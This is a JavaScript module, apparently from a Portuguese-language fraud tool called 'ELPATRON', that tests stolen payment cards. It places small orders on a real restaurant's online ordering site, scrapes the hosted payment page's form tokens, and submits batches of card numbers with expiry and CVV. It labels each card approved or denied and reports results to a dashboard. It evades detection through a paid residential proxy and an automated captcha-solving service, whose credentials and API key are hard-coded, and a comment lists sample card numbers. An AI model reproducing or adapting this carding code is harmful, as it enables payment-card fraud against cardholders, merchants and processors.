'use strict'
const axios = require('axios')
const tunnel = require('tunnel');
const Func = use("./func")
const Redis = use('Redis');
const Ws = use('Ws')

const fetch = require('node-fetch');
module.exports = {

    async cardValidation(id, username, token) {

        const Topic = await Ws.getChannel('users:*').topic('users:' + id)
        //const deathbycaptcha = await Database.from('proxy').where('name', 'deathbycaptcha')
        try {
            console.log('estou no card validation')
            //const date = await Func.Pickup_time();

            const agent = tunnel.httpsOverHttp({
                proxy: {
                    host: 'gate.dc.smartproxy.com',
                    port: 20000,
                    proxyAuth: `virgem:virgem`,
                },
            });

            let data = '{"skin":"weborder","establishmentId":1,"items":[{"modifieritems":[],"price":1.5,"product":209,"product_name_override":"z","quantity":1,"product_sub_id":"c1160"}],"orderInfo":{"created_date":"2020-03-28T15:45:00","pickup_time":"2020-03-31T15:45:00","dining_option":0,"customer":{"phone":"1","email":"b@o.com","first_name":"B","last_name":"L"},"call_name":""},"paymentInfo":{"tip":0,"type":2},"recaptcha_v2_token":"' + token + '"}';
            await axios.post(`https://amarithcafe.revelup.com/weborders/create_order_and_pay_v1/`, data, {
                headers: {
                    'Host': 'amarithcafe.revelup.com',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
                    'Accept': 'application/json',
                    'Referer': 'https://amarithcafe.revelup.com/weborder/?establishment=1',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Connection': 'keep - alive'
                }
            }).then(response => {
                let keys = Object.keys(response.data)
                for (const key of keys) {

                    if (key == 'errorMsg') {
                        //////////////q
                        this.cardValidation(id, username)
                        // this.getFilds(id, username, 'code')
                    }
                    if (key == 'data') {
                        let code = response.data.data.query.TransactionSetupID;
                        console.log('code: ' + code)
                        this.getFilds(id, username, code)
                    }
                }
            }).catch(err => err)
        } catch (error) {
            console.log(error.message)
        }

    },
    async getFilds(id, username, code) {
        const Topic = await Ws.getChannel('users:*').topic('users:' + id)
        if (code === 'code') {
            if (Topic) {
                await Topic.broadcastToAll('atividade', 'erro na verificação da orden Aguarde....')
            }
            return
        }
        try {

            // const cards = await CadastroCards.where({ tested: false, owner: username, userID: id }).limit(5);
            await axios.post(`https://transaction.hostedpayments.com/?TransactionSetupID=${code}`, {
                headers: {
                    'Host': 'transaction.hostedpayments.com',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                },

                'USERAGENT': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
            }).then(async response => {

                let GETVIEWSTATE = response.data.indexOf('name="__VIEWSTATE" id="__VIEWSTATE" value="'); //47
                let GETVIEWSTATEGENERATOR = response.data.indexOf('name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="'); //64
                let GETEVENTVALIDATION = response.data.indexOf('name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="');//59

                let FinalVIEWSTATE = response.data.indexOf('"', GETVIEWSTATE + 44);
                let FinalVIEWSTATEGENERATOR = response.data.indexOf('"', GETVIEWSTATEGENERATOR + 62);
                let FinalEVENTVALIDATION = response.data.indexOf('"', GETEVENTVALIDATION + 56);

                let STATE = encodeURIComponent(response.data.substr(GETVIEWSTATE + 43, FinalVIEWSTATE - (GETVIEWSTATE + 43)))
                let STATEGENERATOR = encodeURIComponent(response.data.substr(GETVIEWSTATEGENERATOR + 61, FinalVIEWSTATEGENERATOR - (GETVIEWSTATEGENERATOR + 61)))
                let EVENTVALIDATION = encodeURIComponent(response.data.substr(GETEVENTVALIDATION + 55, FinalEVENTVALIDATION - (GETEVENTVALIDATION + 55)))


                //let cards = ['6509079001410445|12|2024|778', '6504867262783814|06|2023|000', '6504867262787880|06|2023|000'];
                console.log('peguei campos')
                let cardssalvar = []
                let cont = 0;
                setTimeout(async () => {
                    Redis.lrange(id + 'listcards', 0, -1, async (err, cards) => {
                        const Topic = await Ws.getChannel('users:*').topic('users:' + id)
                        if (cards != null) {

                            (cards.length > 5) ? cont = 5 : cont = cards.length;

                            for (let i = 0; i < cont; i++) {

                                let cardSeparetion = cards[i].split('|');
                                let cardAno = cardSeparetion[2].substr(-2);
                                //let data = `scriptManager=upFormHP%7CprocessTransactionButton&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=${STATE}__VIEWSTATEGENERATOR=${STATEGENERATOR}&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=${EVENTVALIDATION}&hdnCancelled=&cardNumber=${cardSeparetion[0]}&ddlExpirationMonth=${cardSeparetion[1]}&ddlExpirationYear=${cardAno}&CVV=${cardSeparetion[3]}&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&__ASYNCPOST=true&`;
                                let data = `scriptManager=upFormHP%7CprocessTransactionButton&hdnCancelled=&cardNumber=${cardSeparetion[0]}&ddlExpirationMonth=${cardSeparetion[1]}&ddlExpirationYear=${cardAno}&CVV=${cardSeparetion[3]}&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=${STATE}&__VIEWSTATEGENERATOR=${STATEGENERATOR}&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=${EVENTVALIDATION}&__ASYNCPOST=true&`
                                axios.post(`https://transaction.hostedpayments.com/?TransactionSetupID=${code}`, data, {
                                    headers: {
                                        'Host': 'transaction.hostedpayments.com',
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
                                        'Accept': '*/*',
                                        'X-Requested-With': 'XMLHttpRequest',
                                        'X-MicrosoftAjax': 'Delta=true',
                                        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                                        'Connection': 'keep-alive',
                                        'Referer': `https://transaction.hostedpayments.com/?TransactionSetupID=${code}`,
                                    },
                                    'USERAGENT': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
                                }).then(async (response) => {
                                    let GETR = response.data.indexOf('<b>Error</b>:');
                                    let ENDR = response.data.indexOf('</span>', GETR + 12);
                                    let result = response.data.substr(GETR + 13, ENDR - (GETR + 13))

                                    switch (result.trim()) {
                                        case 'Call Issuer':
                                            cardssalvar.push({
                                                cards: {
                                                    valid: true,
                                                    card: cards[i]
                                                }

                                            })
                                            let aprov = '<a href="#">' + cards[i] + '  </a><span class="label label-sm label-success">APROVADO</span> <span class="label label-sm label-info">ELPATRON</span>'
                                            if (Topic) {
                                                await Topic.broadcastToAll('aprovados', 1)
                                                await Topic.broadcastToAll('testados', 1)
                                                await Topic.broadcastToAll('listaprovados', aprov)
                                                await Topic.broadcastToAll('atividade', 'ELPATRON, Card verificado  Aguarde....')
                                            }

                                            break;
                                        case 'TransactionSetupID expired':

                                            break;

                                        default:

                                            cardssalvar.push({
                                                cards: {
                                                    valid: false,
                                                    card: cards[i]
                                                }
                                            })
                                            let reprov = '<a href="#">' + cards[i] + '  </a><span class="label label-sm label-danger">NEGADO</span> <span class="label label-sm label-warning">ELPATRON</span>'
                                            if (Topic) {
                                                await Topic.broadcastToAll('reprovados', 1)
                                                await Topic.broadcastToAll('testados', 1)
                                                await Topic.broadcastToAll('listreprovados', reprov)
                                                await Topic.broadcastToAll('atividade', 'ELPATRON, Card verificado  Aguarde....')
                                            }
                                            break;
                                    }
                                    //fim do then
                                    console.log(i)
                                    console.log(cont)
                                    if (i + 1 == cont) {
                                        //excluir list


                                        let dados = {
                                            userID: id,
                                            owner: username,
                                            cards: cardssalvar
                                        }
                                        console.log('cheguei aki')
                                        this.validation(id, username)
                                        await fetch('http://cards:3332/cadastroCards', {
                                            method: 'post',
                                            body: JSON.stringify(dados),
                                            headers: { 'Content-Type': 'application/json' },
                                        })
                                            .then(res => res)
                                            .then(json => json)
                                            .catch(erro => erro);



                                        for (const card of cardssalvar) {
                                            Redis.lrem(id + 'listcards', 0, card);
                                        }
                                        setTimeout(async () => {
                                            await Redis.exists(id + 'listcards', async (err, result) => {
                                                if (result == 0) {
                                                    const Topic = await Ws.getChannel('users:*').topic('users:' + id)
                                                    if (Topic) {

                                                        await Topic.broadcastToAll('status', 'Aguardando...')

                                                        await Topic.broadcastToAll('atividade', 'Processo finalizado com sucesso!!')

                                                    }
                                                }
                                            })
                                        }, 500);
                                    }

                                });
                            }// fim do for


                        } else {
                            const Topic = await Ws.getChannel('users:*').topic('users:' + id)
                            if (Topic) {
                                Redis.set(id + 'stop', '');
                                await Topic.broadcastToAll('status', 'Aguardando...')

                                await Topic.broadcastToAll('atividade', 'Processo finalizado com sucesso!!')

                            }
                        }

                    })

                }, 200);
            });


        } catch (error) {
            console.log(error.message)
        } finally {

            setTimeout(async () => {

                await Redis.exists(id + 'listcards', async (err, result) => {
                    if (result == 1) {
                        const token = {
                            "id": id,
                            "redis": true,
                            "googlekey": "6Ld4hsgUAAAAACpJsfH-QTkIIcs0NAUE1VzDZ8Xq",
                            "pageurl": "https://amarithcafe.revelup.com",
                            "site": {
                                "name": "twocaptcha",
                                "api": "e262288cabf75ce03e50c90de3c6db9c"
                            }
                        }
                        fetch('http://captcha:3331/getToken', {
                            method: 'post',
                            body: JSON.stringify(token),
                            headers: { 'Content-Type': 'application/json' },
                        })
                            .then(res => res.json())
                            //.then(json => console.log(json))
                            .catch(erro => erro);
                    }

                })

            }, 500);
        }
    },
    async validation(id, username) {
        console.log('validadtion')
        let cont = 0;
        let time = setInterval(async () => {
            console.log('esperando token')
            await Redis.exists(id + 'token', (err, token) => {
                console.log(token)
                cont++;
                if (token == 1) {
                    console.log('entrei  n o token')
                    clearInterval(time);
                    cont = 0;
                    Redis.get(id + 'token', (err, token) => {
                        console.log(' entei no amarithcafe')
                        this.cardValidation(id, username, token)
                        Redis.del(id + 'token');
                    })

                }
                if (cont == 16) {
                    console.log('entrei n o cont 16')

                    cont = 0;
                    const token = {
                        "id": id,
                        "redis": true,
                        "googlekey": "6Ld4hsgUAAAAACpJsfH-QTkIIcs0NAUE1VzDZ8Xq",
                        "pageurl": "https://amarithcafe.revelup.com",
                        "site": {
                            "name": "twocaptcha",
                            "api": "e262288cabf75ce03e50c90de3c6db9c"
                        }
                    }
                    console.log('pegar novo  captcha')

                    fetch('http://captcha:3331/getToken', {
                        method: 'post',
                        body: JSON.stringify(token),
                        headers: { 'Content-Type': 'application/json' },
                    })
                        .then(res => res.json())
                        //.then(json => console.log(json))
                        .catch(erro => erro);

                }

            });

        }, 5000);
    },
}